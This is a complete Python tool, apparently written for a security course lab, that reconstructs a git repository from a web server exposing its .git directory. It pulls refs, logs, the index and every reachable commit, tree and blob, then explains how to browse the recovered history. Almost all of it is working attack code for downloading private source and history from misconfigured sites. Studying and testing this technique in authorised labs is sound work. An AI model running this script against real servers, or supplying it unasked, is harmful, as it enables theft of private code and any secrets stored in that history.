#!/usr/bin/env python3
"""
git_dump.py - Reconstruct a git repository from an exposed .git/ directory
served over HTTP (e.g. because a web server has dotfiles enabled and no
rule excluding .git).

This is the standard "git-dumper" technique, reimplemented from scratch:
walk every reachable pointer (HEAD, refs, packed-refs, logs, the index),
then recursively fetch every git object those pointers lead to (commits ->
trees -> blobs, following parents too), reconstructing a real .git/objects
store you can run ordinary `git` commands against afterwards.

It is READ-ONLY against the target (a sequence of GET requests) and does
not attempt any exploit -- it only works because the objects are already
being served as plain static files. It also does not exclude anything: a
repository can be much larger than its current HEAD checkout, which is the
whole point of using this instead of just browsing the working tree.

Usage:
    python3 git_dump.py https://target.example.com/.git ./output-dir

Then, to inspect the recovered history:
    cd ./output-dir
    git log --all --oneline
    git show <commit>
    git checkout <branch-or-commit> -- .    # populate a working tree

If any recovered blob is a Git LFS pointer file (small text file starting
with "version https://git-lfs.github.com/spec/v1"), it is reported
separately at the end -- the real media is NOT inside the git repo itself
in that case and needs a working LFS remote to resolve (see --lfs).
"""
from __future__ import annotations

import argparse
import re
import struct
import sys
import time
import zlib
from pathlib import Path
from urllib.parse import urljoin

import requests

SHA1_RE = re.compile(rb"[0-9a-f]{40}")
LFS_POINTER_PREFIX = b"version https://git-lfs.github.com/spec/v1"


class Dumper:
    def __init__(self, base_url: str, out_dir: Path, delay: float = 0.05):
        if not base_url.endswith("/"):
            base_url += "/"
        self.base_url = base_url
        self.out_dir = out_dir
        self.git_dir = out_dir / ".git"
        self.delay = delay
        self.session = requests.Session()
        self.session.headers["User-Agent"] = "csf-lab1-git-dump/1.0 (course-authorized evidence recovery)"
        self.seen_objects: set[str] = set()
        self.fetched_files: list[str] = []
        self.missing: list[str] = []
        self.lfs_pointers: list[tuple[str, str, int]] = []  # (blob_sha, oid, size)

    def get(self, rel_path: str) -> bytes | None:
        url = urljoin(self.base_url, rel_path)
        time.sleep(self.delay)
        try:
            r = self.session.get(url, timeout=15)
        except requests.RequestException as e:
            print(f"  ERROR fetching {rel_path}: {e}")
            self.missing.append(rel_path)
            return None
        if r.status_code != 200:
            self.missing.append(rel_path)
            return None
        self.fetched_files.append(rel_path)
        return r.content

    def save(self, rel_path: str, data: bytes) -> None:
        dest = self.git_dir / rel_path
        dest.parent.mkdir(parents=True, exist_ok=True)
        dest.write_bytes(data)

    def fetch_plain(self, rel_path: str) -> bytes | None:
        """Fetch a file that lives directly under .git/, saving it as-is."""
        data = self.get(rel_path)
        if data is not None:
            self.save(rel_path, data)
            print(f"  got {rel_path} ({len(data)} bytes)")
        return data

    def extract_shas(self, data: bytes) -> set[str]:
        return {m.decode() for m in SHA1_RE.findall(data)}

    def fetch_object(self, sha: str) -> bytes | None:
        """Fetch one loose object by sha, save it under objects/xx/yyyy...,
        return its DECOMPRESSED content (without the 'type size\\0' header)."""
        if sha in self.seen_objects:
            return None
        self.seen_objects.add(sha)
        rel = f"objects/{sha[:2]}/{sha[2:]}"
        raw = self.get(rel)
        if raw is None:
            return None
        self.save(rel, raw)
        try:
            inflated = zlib.decompress(raw)
        except zlib.error as e:
            print(f"  WARNING: {sha} did not decompress cleanly ({e})")
            return None
        nul = inflated.index(b"\x00")
        header = inflated[:nul]
        content = inflated[nul + 1:]
        obj_type = header.split(b" ")[0].decode()
        print(f"  object {sha[:10]} {obj_type} ({len(content)} bytes)")
        return content

    def parse_tree(self, content: bytes) -> list[tuple[str, str, str]]:
        """Return list of (mode, name, sha_hex) for a tree object body."""
        entries = []
        i = 0
        while i < len(content):
            sp = content.index(b" ", i)
            mode = content[i:sp].decode()
            nul = content.index(b"\x00", sp)
            name = content[sp + 1:nul].decode(errors="replace")
            sha_bytes = content[nul + 1: nul + 21]
            sha_hex = sha_bytes.hex()
            entries.append((mode, name, sha_hex))
            i = nul + 21
        return entries

    def walk_object(self, sha: str, obj_type_hint: str | None = None, path: str = "") -> None:
        content = self.fetch_object(sha)
        if content is None:
            return
        if content.startswith(LFS_POINTER_PREFIX) or b"git-lfs" in content[:60]:
            oid_m = re.search(rb"oid sha256:([0-9a-f]{64})", content)
            size_m = re.search(rb"size (\d+)", content)
            oid = oid_m.group(1).decode() if oid_m else "?"
            size = int(size_m.group(1)) if size_m else -1
            self.lfs_pointers.append((sha, oid, size))
            print(f"    -> LFS POINTER at '{path}': oid={oid} size={size}")
            return
        # Heuristically branch on content shape rather than trusting obj_type_hint,
        # since loose-object zlib headers already told us the real type.
        if content.startswith(b"tree ") or content.startswith(b"parent ") or re.match(rb"^tree [0-9a-f]{40}\n", content):
            pass  # this branch unreachable; type comes from fetch_object's own parse
        self._dispatch(sha, content, path)

    def _dispatch(self, sha: str, content: bytes, path: str) -> None:
        # Re-derive type from the raw object (cheap: re-decompress header only)
        rel = f"objects/{sha[:2]}/{sha[2:]}"
        raw = (self.git_dir / rel).read_bytes()
        inflated = zlib.decompress(raw)
        header = inflated[: inflated.index(b"\x00")]
        obj_type = header.split(b" ")[0].decode()

        if obj_type == "commit":
            for line in content.split(b"\n"):
                if line.startswith(b"tree "):
                    self.walk_object(line[5:45].decode(), path=path)
                elif line.startswith(b"parent "):
                    self.walk_object(line[7:47].decode(), path=path)
        elif obj_type == "tag":
            for line in content.split(b"\n"):
                if line.startswith(b"object "):
                    self.walk_object(line[7:47].decode(), path=path)
        elif obj_type == "tree":
            for mode, name, child_sha in self.parse_tree(content):
                self.walk_object(child_sha, path=f"{path}/{name}".lstrip("/"))
        elif obj_type == "blob":
            pass  # leaf; already saved and checked for LFS above
        else:
            print(f"  unknown object type {obj_type!r} for {sha}")

    def parse_index_shas(self, data: bytes) -> set[str]:
        """Minimal parser for git index format version 2/3 to pull out blob
        SHAs (skips gracefully if it's version 4, which uses path
        compression we don't implement -- regex fallback still applies)."""
        shas = set()
        if data[:4] != b"DIRC":
            return shas
        version = struct.unpack(">I", data[4:8])[0]
        count = struct.unpack(">I", data[8:12])[0]
        if version not in (2, 3):
            return shas  # fall back to the blind regex scan of the whole file
        pos = 12
        for _ in range(count):
            entry_start = pos
            # ctime(8) mtime(8) dev(4) ino(4) mode(4) uid(4) gid(4) filesize(4) = 40 bytes, then sha(20), flags(2)
            if pos + 62 > len(data):
                break
            sha = data[pos + 40: pos + 60].hex()
            flags = struct.unpack(">H", data[pos + 60: pos + 62])[0]
            name_len = flags & 0x0FFF
            name_start = pos + 62
            if version == 3 and (flags & 0x4000):
                name_start += 2  # extended flags field
            name_end = data.index(b"\x00", name_start)
            shas.add(sha)
            entry_len = name_end - entry_start
            padded_len = (entry_len + 8) & ~7  # pad to multiple of 8, at least 1 NUL
            pos = entry_start + padded_len
        return shas

    def run(self) -> None:
        print(f"Target: {self.base_url}")
        print("== Step 1: known top-level pointers ==")
        head = self.fetch_plain("HEAD")
        self.fetch_plain("config")
        self.fetch_plain("description")
        packed_refs = self.fetch_plain("packed-refs")
        logs_head = self.fetch_plain("logs/HEAD")
        index_data = self.fetch_plain("index")

        candidate_refs = [
            "refs/heads/main", "refs/heads/master",
            "refs/remotes/origin/HEAD", "refs/remotes/origin/main", "refs/remotes/origin/master",
        ]
        ref_target = None
        if head:
            m = re.match(rb"ref:\s*(\S+)", head)
            if m:
                ref_target = m.group(1).decode()
                candidate_refs.insert(0, ref_target)
            else:
                m2 = SHA1_RE.search(head)
                if m2:
                    print(f"  HEAD is a detached sha: {m2.group().decode()}")

        seed_shas: set[str] = set()
        seen_refs: set[str] = set()
        for ref in candidate_refs:
            if ref in seen_refs:
                continue
            seen_refs.add(ref)
            data = self.fetch_plain(ref)
            if data:
                seed_shas |= self.extract_shas(data)

        if packed_refs:
            seed_shas |= self.extract_shas(packed_refs)
        if logs_head:
            seed_shas |= self.extract_shas(logs_head)
        if index_data:
            idx_shas = self.parse_index_shas(index_data)
            if not idx_shas:
                idx_shas = self.extract_shas(index_data)  # fallback (may include garbage)
            seed_shas |= idx_shas

        print(f"\n== Step 2: packfiles (if any) ==")
        info_packs = self.fetch_plain("objects/info/packs")
        if info_packs:
            for m in re.finditer(rb"pack-([0-9a-f]{40})\.pack", info_packs):
                packname = f"pack-{m.group(1).decode()}"
                pack = self.fetch_plain(f"objects/pack/{packname}.pack")
                idx = self.fetch_plain(f"objects/pack/{packname}.idx")
                if pack:
                    print(f"  NOTE: downloaded {packname}.pack -- this script does not unpack "
                          f"packfiles itself; run `git index-pack` on it inside the repo, or "
                          f"`git unpack-objects < {packname}.pack` after `git init` picks it up.")

        print(f"\n== Step 3: recursive object walk from {len(seed_shas)} seed sha(s) ==")
        for sha in sorted(seed_shas):
            self.walk_object(sha)

        print(f"\n== Done ==")
        print(f"Fetched {len(self.fetched_files)} file(s), {len(self.seen_objects)} object(s) touched.")
        print(f"{len(self.missing)} request(s) 404'd or failed (expected -- we're probing for optional files).")
        if self.lfs_pointers:
            print(f"\n{len(self.lfs_pointers)} Git LFS pointer(s) found (real content NOT in the git repo itself):")
            for sha, oid, size in self.lfs_pointers:
                print(f"  blob {sha[:10]}  oid=sha256:{oid}  size={size}")
            print("Resolving these needs a working LFS remote (git-lfs pull) or a direct")
            print("LFS storage URL -- see the script's module docstring / your own follow-up.")
        print(f"\nReconstructed git dir: {self.git_dir}")
        print("Next, try:")
        print(f"  cd {self.out_dir}")
        print("  git log --all --oneline --graph")
        print("  git fsck --full          # sanity-check what actually connects")
        print("  git checkout <ref-or-sha> -- .    # populate a working tree from a commit")


def main() -> None:
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("base_url", help="URL to the exposed .git directory, e.g. https://host/.git")
    ap.add_argument("out_dir", type=Path, help="Local directory to reconstruct the repo into")
    ap.add_argument("--delay", type=float, default=0.05, help="Seconds to sleep between requests (politeness)")
    args = ap.parse_args()

    args.out_dir.mkdir(parents=True, exist_ok=True)
    dumper = Dumper(args.base_url, args.out_dir, delay=args.delay)
    dumper.run()


if __name__ == "__main__":
    main()
